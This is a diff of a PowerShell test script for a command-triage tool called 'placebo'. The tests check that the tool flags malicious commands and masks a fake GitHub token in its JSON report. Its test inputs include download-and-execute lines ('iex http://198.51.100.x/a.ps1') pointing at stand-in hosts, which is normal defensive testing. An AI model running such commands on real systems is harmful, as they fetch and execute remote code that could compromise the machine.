@@ -11,6 +11,8 @@ $tmp = if ($env:TEMP) { $env:TEMP } elseif ($env:TMPDIR) { $env:TMPDIR } else { 
 $work = Join-Path $tmp ('plb_e2e_' + [guid]::NewGuid().ToString('N').Substring(0, 8))
 New-Item -ItemType Directory -Force -Path $work | Out-Null
 
+$tok = 'ghp_' + ('A' * 36)
+
 $script:pass = 0; $script:fail = 0; $script:failures = @()
 function Assert-True {
     param([Parameter(Mandatory)][bool]$Cond, [Parameter(Mandatory)][string]$Name)
@@ -46,13 +48,18 @@ $std = 'echo http://198.51.100.1/x | ' # contains url but benign-ish; use iex to
 $stdinOut = 'iex http://198.51.100.1/a.ps1' | & $pwsh -NoProfile -File $dist triage - --no-banner
 Assert-True ($LASTEXITCODE -ge 1 -and ($stdinOut -join ' ') -match 'SUSPICIOUS|MALICIOUS') -Name 'stdin triage works'
 
-# json structure + masking
+# json structure + masking (diagnose windows-native arg quirks if it breaks)
 $fxJson = Join-Path $work 'tri.json'
-& $pwsh -NoProfile -File $dist triage "powershell -c iex http://198.51.100.4/a.ps1; echo 'ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcd'" --json --out=$fxJson | Out-Null
+$triCmd = "powershell -c iex http://198.51.100.4/a.ps1; echo '$tok'"
+$jsonRun = & $pwsh -NoProfile -File $dist triage $triCmd --json --out=$fxJson 2>&1
+$jsonRc = $LASTEXITCODE
+if (-not (Test-Path $fxJson)) {
+    Write-Output "  diag: rc=$jsonRc output: $($jsonRun -join ' | ')"
+}
 $jraw = [System.IO.File]::ReadAllText($fxJson)
 $j = $jraw | ConvertFrom-Json
 Assert-True ($null -ne $j -and $j.tool -eq 'placebo' -and $j.verdict -ne '') -Name 'json report structure'
-Assert-True ($jraw -notmatch 'ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ') -Name 'json report carries no full token'
+Assert-True ($jraw -notmatch [regex]::Escape($tok)) -Name 'json report carries no full token'
 
 # md report
 $fxMd = Join-Path $work 'tri.md'
